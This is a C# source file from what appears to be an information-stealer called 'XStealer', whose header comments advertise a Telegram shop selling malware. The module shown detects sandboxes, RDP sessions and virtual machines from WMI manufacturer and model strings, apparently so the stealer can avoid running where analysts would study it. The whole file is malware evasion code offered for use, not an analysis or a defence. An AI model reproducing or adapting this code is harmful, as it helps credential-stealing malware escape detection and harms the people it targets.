// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Machine
{
    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.Linq;
    using System.Management;
    using System.Windows.Forms;
    using Helpers;

    public static class CheckVirtual
    {
        public static bool IsRdpAvailable() => SystemInformation.TerminalServerSession == true;

        public static bool SandBoxies() => Process.GetProcessesByName("SbieCtrl").Length > 0 &&
        NativeMethods.GetModuleHandle("SbieDll.dll") != IntPtr.Zero;

        private static List<string> GetModelsAndManufactures()
        {
            var ModMan = new List<string>();
            try
            {
                using var searcher = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_ComputerSystem");
                using ManagementObject items = searcher.Get().OfType<ManagementObject>().Where(p => p != null).FirstOrDefault();
                if (items["Manufacturer"] != null || items["Model"] != null)
                {
                    ModMan.Add(items["Manufacturer"]?.ToString().ToLower());
                    ModMan.Add(items["Model"]?.ToString().ToLower());
                }
            }
            catch { }
            return ModMan;
        }

        public static bool CheckWMI()
        {
            // List of virtual machines
            var VirtualNames = new List<string>
            {
                "virtual", "vmbox", "vmware", "virtualbox", "box",
                "thinapp", "VMXh", "innotek gmbh", "tpvcgateway",
                "tpautoconnsvc", "vbox", "kvm", "red hat"
            };
            List<string> list = GetModelsAndManufactures(); // Get list string "Model" and "Manufacturer"
            // We go through the list
            foreach (string spisok in list)
            {
                return VirtualNames.Contains(spisok);
            }
            return false;
        }

        public static bool Inizialize => CheckWMI() || IsRdpAvailable() || SandBoxies();
    }
}